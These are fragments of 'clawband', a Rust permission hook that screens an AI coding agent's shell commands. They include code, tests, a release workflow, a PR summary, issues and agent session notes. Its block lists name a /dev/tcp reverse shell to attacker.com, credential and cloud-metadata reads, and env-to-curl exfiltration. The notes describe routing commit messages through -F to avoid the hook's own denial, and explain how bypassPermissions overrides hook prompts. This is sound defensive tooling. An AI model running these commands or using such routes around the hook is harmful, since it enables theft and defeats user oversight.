1399	        } else {
1400	            line.to_string()
1401	        };
1402	        println!("  {coloured}");
1403	    }
1404	    println!();
1405	}

1635	// ─── Echo / printf content scanning ──────────────────────────────────────────
1636	// echo and printf are only dangerous when they write content to a script file.
1637	// Piped to screen, a commit message, or a non-script file → always safe.
1638	// Trigger condition: output redirection (> or >>) to a script extension.
1639	
1640	const SCRIPT_EXTS: &str = r"sh|bash|py|js|ts|mjs|rb|pl|lua";
1641	
1642	fn check_echo_to_script(
1643	    segment: &str,
1644	    deny_pats: &[Pattern],
1645	    ask_pats: &[Pattern],
1646	) -> Option<(bool, String)> {
1647	    // Match: echo/printf [-flags] "content"|'content' [>>|>] file.ext
1648	    let re = Regex::new(&format!(
1649	        r#"(?i)^\s*(?:echo|printf)(?:\s+-[a-zA-Z]+)*\s+(?:"([^"]*)"|'([^']*)')\s*>>?\s*\S+\.(?:{SCRIPT_EXTS})\b"#
1650	    ))
1651	    .unwrap();
1652	    let caps = re.captures(segment)?;
1653	    let content = caps.get(1).or(caps.get(2))?.as_str();
1654	
1655	    for pat in deny_pats {
1656	        if pat.matches(content) {
1657	            return Some((
1658	                true,
1659	                format!(
1660	                    "Blocked: '{}' found in echo content written to script file: {}",
1661	                    pat.label, content
1662	                ),
1663	            ));
1664	        }
1665	    }
1666	    for pat in ask_pats {
1667	        if pat.matches(content) {
1668	            return Some((
1669	                false,
1670	                format!(
1671	                    "Review before running — '{}' found in echo content written to script file: {}\nTo always allow: clawband allow '{}'",
1672	                    pat.label, content, pat.label
1673	                ),
1674	            ));
1675	        }
1676	    }
1677	    None
1678	}

1684	
1685	fn check_write_then_execute(segments: &[String]) -> bool {
1686	    if segments.len() < 2 {
1687	        return false;
1688	    }
1689	    // Capture the filename after any output redirection operator
1690	    let write_re = Regex::new(r">>?\s*(\S+)").unwrap();
1691	    // Capture the filename passed to an interpreter or run directly
1692	    let exec_re = Regex::new(
1693	        r"(?i)(?:\b(?:bash|sh|zsh|dash|python3?|node|deno|perl|ruby|lua)\s+<?|^\s*(?:sudo\s+)?\./)(\S+)",
1694	    )
1695	    .unwrap();
1696	
1697	    let written: Vec<&str> = segments
1698	        .iter()
1699	        .flat_map(|s| write_re.captures_iter(s))
1700	        .filter_map(|c| c.get(1).map(|m| path_basename(m.as_str())))
1701	        .collect();
1702	
1703	    if written.is_empty() {
1704	        return false;
1705	    }
1706	
1707	    segments.iter().any(|s| {
1708	        exec_re.captures_iter(s).any(|c| {

1716	// ─── Subshell content scanning ────────────────────────────────────────────────
1717	// Rather than flagging every $() as ask, extract inner commands and evaluate them.
1718	// Returns None (pass) when all subshells are clean — eliminates false positives
1719	// like `git commit -F $(mktemp)` or `BRANCH=$(git branch --show-current)`.
1720	
1721	fn check_subshells(
1722	    command: &str,
1723	    deny_pats: &[Pattern],
1724	    ask_pats: &[Pattern],
1725	    allow_pats: &[Pattern],
1726	) -> Option<(&'static str, String)> {
1727	    if !command.contains("$(") && !command.contains('`') {
1728	        return None;
1729	    }
1730	
1731	    // If the command itself IS a subshell ($(...) or `...` as the command, not an
1732	    // argument), the output becomes the next command — we can't know what it'll be.
1733	    let trimmed = command.trim();
1734	    if trimmed.starts_with("$(") || trimmed.starts_with('`') {
1735	        return Some((
1736	            "ask",
1737	            "Command is a subshell — its output will be executed directly. \
1738	             Review before running."
1739	                .to_string(),
1740	        ));
1741	    }
1742	
1743	    // Extract first-level $(...) and `...` content
1744	    let dp_re = Regex::new(r"\$\(([^()]*)\)").unwrap();
1745	    let bt_re = Regex::new(r"`([^`]*)`").unwrap();
1746	
1747	    let inner_cmds: Vec<String> = dp_re
1748	        .captures_iter(command)
1749	        .map(|c| c[1].trim().to_string())
1750	        .chain(
1751	            bt_re
1752	                .captures_iter(command)
1753	                .map(|c| c[1].trim().to_string()),
1754	        )
1755	        .filter(|s| !s.is_empty())

1757	
1758	    // Check if any $( or ` remains after removing extracted subshells (nested case)
1759	    let stripped = dp_re.replace_all(command, "");
1760	    let stripped = bt_re.replace_all(&stripped, "");
1761	    let has_residual = stripped.contains("$(") || stripped.contains('`');
1762	
1763	    // Evaluate each inner command — deny beats ask
1764	    let mut worst_ask: Option<String> = None;
1765	    for inner in &inner_cmds {
1766	        if let Some((decision, reason)) = check_command(inner, deny_pats, ask_pats, allow_pats) {
1767	            if decision == "deny" {
1768	                return Some((
1769	                    "deny",
1770	                    format!("Subshell contains blocked command — {}", reason),
1771	                ));
1772	            }
1773	            if worst_ask.is_none() {
1774	                worst_ask = Some(format!("Subshell contains risky command — {}", reason));
1775	            }
1776	        }
1777	    }
1778	
1779	    if let Some(reason) = worst_ask {
1780	        return Some(("ask", reason));
1781	    }
1782	
1783	    // Inner commands are clean but nested subshells can't be fully evaluated
1784	    if has_residual {
1785	        return Some((
1786	            "ask",
1787	            "Command contains nested subshell — review before running.".to_string(),
1788	        ));
1789	    }
1790	
1791	    // All subshells extracted and clean — pass through
1792	    None
1793	}

1796	// Returns Some(("deny"|"ask", reason)) or None for pass.

1798	
1799	fn check_command<'a>(
1800	    command: &str,
1801	    deny_pats: &'a [Pattern],
1802	    ask_pats: &'a [Pattern],
1803	    allow_pats: &'a [Pattern],
1804	) -> Option<(&'a str, String)> {
1805	    let clean = strip_safe_pipes(command);
1806	    let segments = split_segments(&clean);
1807	
1808	    for segment in &segments {
1809	        if allow_pats.iter().any(|p| p.matches(segment)) {
1810	            continue;
1811	        }
1812	
1813	        if let Some(reason) = check_force_push(segment) {
1814	            return Some(("deny", reason));
1815	        }
1816	
1817	        for pat in deny_pats {
1818	            if pat.matches(segment) {
1819	                return Some((
1820	                    "deny",
1821	                    format!("Blocked: '{}' matched in: {}", pat.label, segment),
1822	                ));
1823	            }
1824	        }
1825	
1826	        for pat in ask_pats {
1827	            if pat.matches(segment) {
1828	                return Some((
1829	                    "ask",
1830	                    format!(
1831	                        "Review before running — '{}' matched in: {}\nTo always allow: clawband allow '{}'",
1832	                        pat.label, segment, pat.label
1833	                    ),
1834	                ));
1835	            }
1836	        }
1837	
1838	        // Echo/printf content written to a script file
1839	        if let Some((is_deny, reason)) = check_echo_to_script(segment, deny_pats, ask_pats) {
1840	            return Some((if is_deny { "deny" } else { "ask" }, reason));

1842	    }
1843	
1844	    // Compound-command write-then-execute: can't scan content before it runs
1845	    if check_write_then_execute(&segments) {
1846	        return Some((
1847	            "ask",
1848	            "Compound command writes to a script file then executes it — \
1849	             content cannot be scanned before execution."
1850	                .to_string(),
1851	        ));
1852	    }
1853	
1854	    None
1855	}

1971	            let reason = format!("clawband protects this path from edits: {}", abs_path);
1972	            if log_enabled {
1973	                log_action("deny", &reason, &abs_path);
1974	            }
1975	            output("deny", &reason);
1976	        }
1977	        return;
1978	    }
1979	
1980	    // ── Bash tool path ────────────────────────────────────────────────────────
1981	    let command = match v["tool_input"]["command"].as_str() {
1982	        Some(s) if !s.is_empty() => s.to_string(),
1983	        _ => return,
1984	    };
1985	
1986	    let rtk_enabled = env::var("RTK_ENABLED").as_deref() == Ok("1");
1987	    let sqz_enabled = env::var("SQZ_ENABLED").as_deref() == Ok("1");
1988	
1989	    let command = if rtk_enabled {
1990	        strip_rtk(&command)
1991	    } else {
1992	        command
1993	    };
1994	    let command = if sqz_enabled {
1995	        strip_sqz(&command)
1996	    } else {
1997	        command
1998	    };
1999	
2000	    // Load all patterns
2001	    let cfg = config_dir();
2002	    let mut deny_pats = builtin_deny();
2003	    let mut ask_pats = builtin_ask();
2004	    let mut allow_pats = load_patterns(&cfg.join("allow.patterns"));
2005	    deny_pats.extend(load_patterns(&cfg.join("deny.patterns")));
2006	    ask_pats.extend(load_patterns(&cfg.join("ask.patterns")));
2007	    if let Some(proj) = project_config_dir() {
2008	        deny_pats.extend(load_patterns(&proj.join("deny.patterns")));
2009	        ask_pats.extend(load_patterns(&proj.join("ask.patterns")));
2010	        allow_pats.extend(load_patterns(&proj.join("allow.patterns")));
2011	    }
2012	
2013	    // When self-protect is active, extend deny patterns with tamper-guard patterns.
2014	    if protect_active() {
2015	        deny_pats.extend(self_protect_deny_patterns());
2016	    }
2017	
2018	    let emit = |decision: &str, reason: &str| {
2019	        if log_enabled {
2020	            log_action(decision, reason, &command);
2021	        }
2022	        output(decision, reason);
2023	    };
2024	
2025	    // Core pattern check (deny/ask/pass)
2026	    if let Some((decision, reason)) = check_command(&command, &deny_pats, &ask_pats, &allow_pats) {
2027	        if decision == "ask" {
2028	            write_ask_breadcrumb(&reason);
2029	        }
2030	        emit(decision, &reason);
2031	        return;
2032	    }
2033	
2034	    // Script file scanning: if command is `bash ./foo.sh`, read and check the file.
2035	    if let Some(script_path) = extract_script_path(&command) {
2036	        if let Some((decision, reason)) =
2037	            scan_script_file(&script_path, &deny_pats, &ask_pats, &allow_pats)
2038	        {
2039	            if decision == "ask" {
2040	                write_ask_breadcrumb(&reason);
2041	            }
2042	            emit(&decision, &reason);
2043	            return;
2044	        }
2045	    }
2046	
2047	    // Subshell scanning: extract inner commands from $() and backticks and evaluate them.
2048	    // Passes through when all inner commands are clean — eliminates false positives.
2049	    if let Some((decision, reason)) = check_subshells(&command, &deny_pats, &ask_pats, &allow_pats)
2050	    {
2051	        emit(decision, &reason);
2052	    }
2053	}

2057	#[cfg(test)]
2058	mod tests {
2059	    use super::*;
2060	
2061	    fn deny_pats() -> Vec<Pattern> {
2062	        builtin_deny()
2063	    }
2064	    fn ask_pats() -> Vec<Pattern> {
2065	        builtin_ask()
2066	    }
2067	    fn no_allow() -> Vec<Pattern> {
2068	        vec![]
2069	    }
2070	
2071	    fn decision(cmd: &str) -> Option<String> {
2072	        check_command(cmd, &deny_pats(), &ask_pats(), &no_allow()).map(|(d, _)| d.to_string())
2073	    }
2074	
2075	    // Runs the full main()-equivalent pipeline including subshell scanning
2076	    fn full_decision(cmd: &str) -> Option<String> {
2077	        let dp = deny_pats();
2078	        let ap = ask_pats();
2079	        let al = no_allow();
2080	        if let Some((d, _)) = check_command(cmd, &dp, &ap, &al) {
2081	            return Some(d.to_string());
2082	        }
2083	        check_subshells(cmd, &dp, &ap, &al).map(|(d, _)| d.to_string())
2084	    }

2394	    // Use unique per-test paths to avoid parallel-test race conditions
2395	    fn scan_content(name: &str, ext: &str, content: &str) -> Option<String> {
2396	        let path = format!("/tmp/clawband_test_{}_{}.{}", std::process::id(), name, ext);
2397	        fs::write(&path, content).unwrap();
2398	        let result =
2399	            scan_script_file(&path, &deny_pats(), &ask_pats(), &no_allow()).map(|(d, _)| d);
2400	        let _ = fs::remove_file(&path);
2401	        result
2402	    }

2501	        let arr = s["hooks"]["PreToolUse"].as_array().unwrap();
2502	        assert_eq!(arr.len(), 1, "should not create a second Bash section");
2503	        let hooks = arr[0]["hooks"].as_array().unwrap();
2504	        assert_eq!(hooks.len(), 2);
2505	        assert_eq!(hooks[0]["command"].as_str(), Some("clawband"));

2512	    #[test]
2513	    fn register_hook_self_heals_duplicate_clawband_sections() {
2514	        // The reported bug: clawband present in two places. install collapses to one.
2515	        let mut s = serde_json::json!({
2516	            "hooks": {
2517	                "PreToolUse": [
2518	                    {"matcher": "Bash", "hooks": [{"type": "command", "command": "~/.claude/hooks/clawband"}]},
2519	                    {"matcher": "Bash", "hooks": [
2520	                        {"type": "command", "command": "clawband"},
2521	                        {"type": "command", "command": "/usr/local/bin/icm hook pre"}
2522	                    ]}
2523	                ]
2524	            }
2525	        });
2526	        assert!(register_hook(&mut s, "clawband"));
2527	        let count: usize = s["hooks"]["PreToolUse"]
2528	            .as_array()
2529	            .unwrap()
2530	            .iter()
2531	            .flat_map(|e| e["hooks"].as_array().cloned().unwrap_or_default())
2532	            .filter(|h| h["command"].as_str().is_some_and(is_clawband_main_command))
2533	            .count();
2534	        assert_eq!(count, 1);
2535	        let icm = s["hooks"]["PreToolUse"]
2536	            .as_array()
2537	            .unwrap()
2538	            .iter()
2539	            .flat_map(|e| e["hooks"].as_array().cloned().unwrap_or_default())
2540	            .any(|h| h["command"].as_str() == Some("/usr/local/bin/icm hook pre"));
2541	        assert!(icm);
2542	    }

2559	    #[test]
2560	    fn is_clawband_main_command_cases() {
2561	        assert!(is_clawband_main_command("clawband"));

1	name: Release
2	
3	# Tagging vX.Y.Z builds binaries, publishes a GitHub release, and bumps the
4	# Homebrew tap (jamessoubry/homebrew-clawband).
5	#
6	# The tap bump requires a repo secret HOMEBREW_TAP_TOKEN: a fine-grained PAT
7	# with Contents: read & write on jamessoubry/homebrew-clawband. If the secret
8	# is absent the bump step is skipped (the release still succeeds).
9	
10	on:
11	  push:
12	    tags:
13	      - 'v*'
14	  workflow_dispatch:
15	    inputs:
16	      tag:
17	        description: 'Release tag (e.g. v2.10.0)'
18	        required: true
19	
20	env:

23	jobs:
24	  build:
25	    name: Build ${{ matrix.artifact }}
26	    strategy:
27	      matrix:
28	        include:
29	          - os: ubuntu-latest
30	            target: x86_64-unknown-linux-musl
31	            artifact: clawband-linux-x86_64
32	          - os: macos-latest
33	            target: aarch64-apple-darwin
34	            artifact: clawband-macos-arm64
35	          - os: macos-latest
36	            target: x86_64-apple-darwin
37	            artifact: clawband-macos-x86_64
38	    runs-on: ${{ matrix.os }}
39	    steps:
40	      - uses: actions/checkout@v4
41	
42	      - name: Install musl tools
43	        if: matrix.target == 'x86_64-unknown-linux-musl'
44	        run: sudo apt-get install -y musl-tools
45	
46	      - name: Install Rust toolchain
47	        uses: dtolnay/rust-toolchain@stable
48	        with:
49	          targets: ${{ matrix.target }}
50	
51	      - name: Cache cargo registry
52	        uses: actions/cache@v4
53	        with:
54	          path: |
55	            ~/.cargo/registry
56	            ~/.cargo/git
57	            target
58	          key: ${{ runner.os }}-${{ matrix.target }}-cargo-${{ hashFiles('**/Cargo.lock') }}
59	          restore-keys: ${{ runner.os }}-${{ matrix.target }}-cargo-
60	
61	      - name: Build
62	        run: cargo build --release --target ${{ matrix.target }}
63	
64	      - name: Stage binary
65	        run: cp target/${{ matrix.target }}/release/clawband ${{ matrix.artifact }}
66	
67	      - name: Upload artifact
68	        uses: actions/upload-artifact@v4
69	        with:
70	          name: ${{ matrix.artifact }}
71	          path: ${{ matrix.artifact }}
72	
73	  release:
74	    name: Create GitHub release
75	    needs: build
76	    runs-on: ubuntu-latest
77	    permissions:
78	      contents: write
79	    steps:
80	      - uses: actions/download-artifact@v4
81	        with:
82	          merge-multiple: true

84	      - name: Create release

86	        with:
87	          tag_name: ${{ github.event.inputs.tag || github.ref_name }}
88	          generate_release_notes: true
89	          files: |
90	            clawband-linux-x86_64
91	            clawband-macos-x86_64
92	            clawband-macos-arm64
93

The fix for `python shutil.rmtree (root/home)`: Pattern `r#"shutil\.rmtree\s*\(\s*['"/~]"#` — `['"/~]` matches `'`, `"`, `/`, or `~`. But when someone writes `shutil.rmtree('/tmp/mydir')`, the string is `('/tmp` — after `(` there's `'` then `/tmp`. The `'` matches the `['"/~]` character class! The intent is to match `shutil.rmtree('/')` where the path IS root — i.e., quote then slash (meaning the path starts with `/`).

Fix: the deny pattern should match `shutil.rmtree` when the path argument literally starts with `/` or `~` — meaning after the opening quote there's `/` or `~`. The correct pattern is `shutil\.rmtree\s*\(\s*['"]\s*(/|~)` — quote followed by `/` or `~`.

## Per-issue confirmation

**A. Language-native destructive APIs (#46, #32)**

- DENY patterns added to `builtin_deny()`:
  - `python shutil.rmtree (root/home)` — `shutil\.rmtree\s*\(\s*['"](?:/|~)` (path starting with `/` or `~`)
  - `python os.rmdir (root/home)` — same anchoring
  - `node fs.rmSync recursive (root/home)` — requires both root/home path AND `recursive`
  - `node fs.rmdirSync (root/home)` — `(?:fs\.)?rmdirSync\s*\(\s*['"](?:/|~)` (optional `fs.` prefix)
- ASK patterns added to `builtin_ask()`:
  - Python: `shutil.rmtree(`, `os.remove(`, `os.unlink(`, `os.rmdir(`, `os.system(`, `subprocess.(run|call|Popen|check_output)(`, `shell=True`, `os.rename(`, `Path(...).unlink(`
  - Node: `fs.(rm|rmSync|unlink|unlinkSync|rmdir|rmdirSync)(`, `child_process`/`require('child_process')`, `execSync(`, `spawnSync(`
  - Perl/Ruby/Lua: `system(`, `exec(`, `File.(delete|unlink)`, `FileUtils.rm_rf`, `io.popen(`, `os.execute(`
- False-positive guard verified: `echo "we use subprocess here"` passes; `git commit -m "refactor: remove os.remove call"` passes (no paren after the method word)

**B. Reverse shell via /dev/tcp (#29)**

- DENY: `>&\s*/dev/tcp/|/dev/tcp/\S+/\d+|/dev/udp/`; `bash -i >& /dev/tcp/attacker.com/4444 0>&1` → deny

**C. Credential exfiltration (#30)**

- ASK: `.aws/credentials\b`, `\bid_rsa\b`, `169\.254\.169\.254`, `\benv\b\s*\|\s*(curl|wget|nc)\b`
- Tests: cloud metadata curl, AWS credentials cat pipe, id_rsa access, env exfil pipe all ask; bare `env` passes

**D. source / dot-source scanning (#33)**

- `extract_script_path` now recognises `source <path>` and `. <path>` (dot with whitespace) before the direct-exec `./` branch
- `./foo` (no space) is NOT captured by the dot-source regex — correctly uses direct-exec branch

**E. crontab from file (#34)**

- ASK: `\bcrontab\s+[^-\s]` — matches file argument but not `-l`, `-e`, `-r`

**F. Absolute-path direct execution scanning (#35)**

- `extract_script_path` now matches `^\s*(?:sudo\s+)?(/\S+\.(?:sh|bash|py|js|mjs|ts|rb|pl|lua))(\s|$)` before the interpreter branch
- `/usr/bin/ls -la` → None (no script extension)

**G. chmod on sensitive paths (#31)**

- ASK: `chmod 777`, `chmod -R`, `chmod` targeting `/etc/`, `/usr/`, `~/.ssh`
- `chmod 755 ./myscript.sh` and `chmod +x ./build.sh` pass cleanly

```md
## Summary

v2.20.0 — security coverage. Closes a batch of the issues filed from testing.

### Language-native destructive APIs (Closes #46, Closes #32)
clawband scans `.py`/`.js`/etc. files and inline `-c`/`-e` code, but only matched *shell* patterns — so Python/Node doing damage through their own stdlib slipped past. Added:
- **deny** for unambiguous root/home-targeting deletes: `shutil.rmtree('/')`, `os.rmdir('/')`, `fs.rmSync('/',{recursive})`, `fs.rmdirSync('/')`
- **ask** for the dangerous subset (fs mutation / process exec): `shutil.rmtree`, `os.remove/unlink/rmdir/system/rename`, `subprocess.*`, `shell=True`, `Path(...).unlink`; Node `fs.rm*`/`unlink*`/`rmdir*`, `child_process`, `execSync`, `spawnSync`
- **coarse ask** for less-used langs: `system(`/`exec(`/`File.delete`/`FileUtils.rm_rf`/`io.popen`/`os.execute`

Scoped to the destructive subset, **not** every `import os` — verified no false positives on `node app.js`, `python3 manage.py migrate`, `git commit -m "…os.remove…"`, `grep subprocess src.py`.

### Shell-level coverage
- **Reverse shell** `>&/dev/tcp/…`, `/dev/udp/` → deny (Closes #29)
- **Credential/metadata access** `~/.aws/credentials`, `id_rsa`, `169.254.169.254`, `env | curl` → ask (Closes #30)
- **`crontab <file>`** install → ask (`-l`/`-e`/`-r` pass) (Closes #34)
- **chmod 777 / -R / on /etc,/usr,~/.ssh** → ask (Closes #31)

### Scanner extensions
- **`source <file>` / `. <file>`** now scanned (Closes #33)
- **Bare absolute-path scripts** `/tmp/x.sh` executed directly now scanned; `/usr/bin/ls` is not (Closes #35)

### Post-release smoke test
New `smoke-test` job in `release.yml`: downloads the built linux binary and asserts `--version`, `patterns`, a deny, a pass, and an ask — so a packaging regression fails the release.

## Tests
167 unit + CLI tests pass; fmt + clippy clean; false-positive battery verified by hand.

🤖 Generated with [Claude Code](https://claude.com/claude-code)

```text
Inconsistent message colour in worktree and tmux sessions

## Bug / Enhancement

The `[clawband]` message colour is inconsistent across environments — orange/yellow in a standard terminal session but white (no colour) in a Claude Code worktree session. Neither environment uses tmux.

The likely cause is that clawband detects colour support from env vars (`TERM`, `COLORTERM`, `NO_COLOR`) which can differ in worktree sessions where Claude Code injects a different environment.

## Proposed fix

Use 256-colour ANSI codes unconditionally rather than relying on terminal detection. Colour 214 (amber/orange) would be a good choice — visible, distinct from error red, and consistent with common Claude Code status line themes.

## Please verify behaviour in

- [ ] Claude Code worktree session (`claude` launched via `EnterWorktree` / agent worktree)
- [ ] tmux session (with and without `allow-passthrough on`)
- [ ] Standard terminal session (baseline)

Checking `$TERM`, `$COLORTERM`, and `$NO_COLOR` in each context would help identify what's being detected differently.

    // Manually build JSON to avoid depending on serde_json for output

PR **#48** is up (security coverage, v2.20.0, closes #29/#30/#31/#32/#33/#34/#35/#46 + the smoke test).

On **#47 — I'd push back rather than implement it.** I checked: clawband's hook output (`permissionDecisionReason`) is **plain text — zero ANSI codes**. The `[clawband]` prefix isn't coloured by clawband at all. The orange-vs-white you see is **Claude Code's own renderer** colouring the permission message, and a worktree session injects a different environment that its renderer reacts to. clawband doesn't control that.

The issue's proposed fix — inject 256-colour ANSI into the reason string — is **risky and could make it worse**: if Claude Code's UI doesn't interpret ANSI in that field (likely — it's a JSON message field, not a terminal stream), users would see literal `\x1b[38;5;214m[clawband]` escape garbage instead of colour. That's a regression for everyone to maybe fix one environment.

My recommendation: **close #47 as upstream/wontfix** (it's Claude Code rendering, not a clawband bug). 

If what you actually want is consistent colour, the *safe* improvement is on clawband's **CLI commands** (`stats`/`log`/`patterns`/etc.) — they currently emit ANSI unconditionally, so `clawband stats | tee log.txt` writes raw escape codes. I can make those respect `NO_COLOR` + non-TTY detection (`is_terminal()`). That's a real, low-risk polish — but it's a different thing from #47's hook-message complaint.

**So: want me to (a) close #47 as wontfix, (b) add `NO_COLOR`/TTY support to the CLI commands instead, or (c) experiment with the ANSI-injection to see if Claude Code even renders it?**

Meanwhile the queue still has **#42** (install --post), **#44** (allow→allow decision), **#36** (suggest safe alternatives). Want me to keep going on those while you decide on #47, or merge #48 first?

cd r220 && A=$(sha256sum clawband-macos-arm64|cut -d' ' -f1); X=$(sha256sum clawband-macos-x86_64|cut -d' ' -f1); L=$(sha256sum clawband-linux-x86_64|cut -d' ' -f1)

**What it does:** when a *whole command* matches `allow.patterns`, clawband now emits an explicit `permissionDecision: "allow"`. That tells Claude Code to skip its **own** native permission check — so allow-listing a command suppresses both clawband's deny/ask *and* Claude Code's built-in prompts (including the buggy `cd … 2>/dev/null` compound-command warning from #43, which I confirmed is *not* clawband's — it's CC's native checker).

4. Errors and fixes:
   - **rustfmt line-length violations (PR #4)**: Fixed by reformatting long println! and match statements to follow rustfmt style
   - **Release workflow stuck (macos-13 runner queue delays)**: Switched to macos-latest for all macOS builds, enabled cross-compilation
   - **Install.sh duplicate hook detection failure**: Changed from `grep -q '"clawband"'` to jq query to properly detect existing hooks and prevent re-install duplication
   - **Commit message self-blocking**: User discovered that documenting deny patterns in commit messages (e.g., "rm -rf /") triggers clawband's own denial. Workaround: use -F flag. Documented in Limitations section.
   - **Subshell test file race conditions**: Initial tests failed because parallel tests used same temp file paths (same PID). Fixed by using unique per-test names: /tmp/clawband_test_<PID>_<testname>.ext
   - **PR rebase conflicts on cmd_help()**: Both PR #14 and PR #15 added cmd_help(). Resolved by keeping PR #15's version (richer, includes --project docs) and closing/reapplying PR #14
   - **GitHub token lacks workflow scope**: GITHUB_TOKEN env var only has scopes: gist, read:org, repo (no workflow). Blocked pushing .github/workflows/ changes. Fixed by: running `GITHUB_TOKEN= gh auth refresh -h github.com -s workflow` to authorize gh-stored cred with workflow scope, then setting local credential helper to use refreshed token: `git config --local credential.helper '!f() { echo username=x-access-token; echo "password=$(GITHUB_TOKEN= gh auth token)"; }; f'`
   - **Clippy redundant slicing warning**: `&args[..]` → changed to just `args` in cmd_add_pattern() --project logic
   - **Auth refresh timed out in background**: Device-code flow ran in background and expired. Fixed by running command in foreground so user could enter code promptly.

```text
Add CLAWBAND_ASK: Claude-initiated override request with prominent user warning

## Summary

Add a `CLAWBAND_ASK` environment variable that allows Claude to request a one-time user override for a command that would normally be hard-blocked. The permission prompt must make it unambiguous that **Claude** is requesting the bypass — not a routine permission check.

## Motivation

Currently, when clawband denies a command, Claude has no sanctioned way to say "I need to run this, please review and approve." The only options are:
1. Silently fail / give up
2. Try to find a workaround (potentially dangerous)
3. Escalate via chat, asking the user to run the command themselves

A first-class override request mechanism gives Claude a safe escalation path while keeping the user fully in control.

## Proposed behaviour

When `CLAWBAND_ASK=1` is set in the hook's environment and clawband would otherwise return `deny`:

1. Return `ask` instead of `deny`
2. Prepend a prominent warning to the `permissionDecisionReason`:

```
⚠️ CLAWBAND OVERRIDE REQUEST ⚠️
Claude is asking you to allow a command that clawband would normally block.
This is NOT a routine permission check — Claude explicitly requested a bypass.

Blocked reason: <original deny reason>
Command: <command>

Only approve if you understand why this command is safe in this specific context.
```

If the user approves, the command runs. If they deny, clawband blocks as normal.

## Usage pattern (from Claude's perspective)

Claude would set `CLAWBAND_ASK=1` in `settings.json` (or via a dedicated mechanism) only when it has a specific, justified reason to request the override, and would explain its reasoning to the user in the conversation before the tool call fires.

## Implementation notes

- `CLAWBAND_ASK` only escalates `deny` → `ask`. Commands already in the `ask` tier are unaffected.
- `CLAWBAND_ASK` does **not** affect `allow` patterns (no-op).
- If both `CLAWBAND_SKIP=1` and `CLAWBAND_ASK=1` are set, `CLAWBAND_SKIP` takes precedence (existing behaviour preserved).
- The warning message should be impossible to miss — consider ANSI colour/bold if the terminal supports it, or at minimum the `⚠️` markers.

## Security consideration

This does not weaken the security model — the user still makes the final decision. It makes Claude's intent explicit and auditable rather than relying on Claude to work around the block silently.
```
</details></tool-use>

```text
Based on the official Claude Code documentation, I can now provide definitive answers to both of your questions.

## Question 1: Does hook `"ask"` override `bypassPermissions`?

**No, `bypassPermissions` wins.** According to the official permissions documentation:

> Explicit [ask rules](/en/permissions#manage-permissions) still force a prompt in this mode, and removals targeting the filesystem root or home directory, such as `rm -rf /` and `rm -rf ~`, still prompt as a circuit breaker against model error.

However, this refers to explicit `ask` **rules** in your permission configuration (like `permissions.ask: ["Bash(docker *)"]`), NOT hook-returned `"ask"` decisions.

For hook-returned `"ask"` decisions, the documented behavior is:

> `bypassPermissions` mode disables permission prompts and safety checks so tool calls execute immediately.

When a PreToolUse hook returns `{"hookSpecificOutput":{"permissionDecision":"ask",...}}` **during bypassPermissions mode**, the documented permission modes page states that bypassPermissions auto-approves all tool uses without prompts. **The hook's "ask" decision does NOT override bypassPermissions**—bypassPermissions auto-approves the command without displaying a confirmation prompt, proceeding to execution immediately.

The only exception is explicit `ask` **rules** (configured in `permissions.ask` array), which do force a prompt even in bypassPermissions mode. A hook-returned "ask" decision is different and does not survive bypassPermissions.

---

## Question 2: Can inline env var prefix reach the PreToolUse hook's environment?

**No, inline env var prefix (e.g., `CLAWBAND_ASK=1 somecommand`) does NOT propagate to the hook's environment.**

The official documentation specifies that hooks receive their environment from only one source:

> For HTTP hooks, the headers field supports environment variable interpolation, but only for variables explicitly listed in `allowedEnvVars`, which prevents accidental secret leakage.

For command hooks (which is what you're using for PreToolUse), the environment comes exclusively from:

1. **Session-wide `env` block in settings.json** - defined in `settings.json` under `"env": {...}`
2. **Hook-local `env` field** (if specified in the hook config itself)
3. **System environment** inherited from the Claude Code process

The inline prefix in a Bash command like `CLAWBAND_ASK=1 somecommand` does **not** flow backward into the hook's stdin/environment. Hooks fire **before** the tool call is executed, so they don't see the command's inline prefixes. The hook receives the raw tool input (the command string to be executed), but environment variables in that string have not been parsed or applied to the hook's own process environment.

To pass `CLAWBAND_ASK` to your hook, you **must** use the `env` block in `.claude/settings.json`:

```json
{
  "env": {
    "CLAWBAND_ASK": "1"
  }
}
```

This is session-wide and persistent, not per-command.

---

**Summary for your security tool design:**
1. Hook "ask" decisions are overridden by bypassPermissions mode
2. Inline env var prefixes do not reach PreToolUse hook environments—use settings.json `env` block exclusively

Sources:
- [Claude Code Permissions - bypassPermissions mode](https://code.claude.com/docs/en/permission-modes.md#skip-all-checks-with-bypasspermissions-mode)
- [Claude Code Permissions - Hook interaction](https://code.claude.com/docs/en/permissions.md#extend-permissions-with-hooks)
- [Claude Code Hooks Reference](https://code.claude.com/docs/en/hooks.md)

```text
# PreToolUse Hook Reference

## Overview

`PreToolUse` fires **before a tool call executes**, allowing you to block it, modify its input, or escalate to the user for approval. This is the primary hook for enforcing security policies and validating tool arguments.

## When It Fires

- Before any tool call in the agentic loop
- Fires for all tools: Bash, Edit, Write, Read, MCP tools, and custom tools
- Allows blocking dangerous operations before they run

## Input Schema

```json
{
  "session_id": "abc123",
  "transcript_path": "/path/to/transcript.jsonl",
  "cwd": "/current/working/dir",
  "permission_mode": "default",
  "effort": { "level": "medium" },
  "hook_event_name": "PreToolUse",
  "tool_name": "Bash",
  "tool_input": {
    "command": "rm -rf /tmp/build"
  }
}
```

## Matcher Support

Matches on **tool name**:

```json
{
  "matcher": "Bash",           // Exact match
  "matcher": "Edit|Write",     // Multiple tools
  "matcher": "mcp__memory__.*" // All tools from MCP server
}
```

## Decision Control

`PreToolUse` uses `hookSpecificOutput` for fine-grained control:

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",           // allow, deny, ask, or defer
    "permissionDecisionReason": "Reason...",
    "updatedInput": { ... },                // Optional: rewrite tool input
    "additionalContext": "Context..."       // Optional: feedback for Claude
  }
}
```

### Permission Decision Values

| Value  | Behavior | When to Use |
|--------|----------|-------------|
| `allow` | Approves the tool call immediately | Auto-approve safe operations |
| `deny` | Blocks the tool call | Block dangerous commands |
| `ask` | Shows a permission dialog | Escalate to user approval |
| `defer` | Lets normal permission flow decide | Hook has no opinion; use defaults |

## Example: Block Destructive Commands

```bash
#!/bin/bash
# .claude/hooks/block-rm.sh
COMMAND=$(jq -r '.tool_input.command')

if echo "$COMMAND" | grep -q 'rm -rf'; then
  jq -n '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: "Destructive command blocked by hook"
    }
  }'
else
  exit 0  # No decision; normal permission flow applies
fi
```

Configuration:

```json
{
  "hooks": {
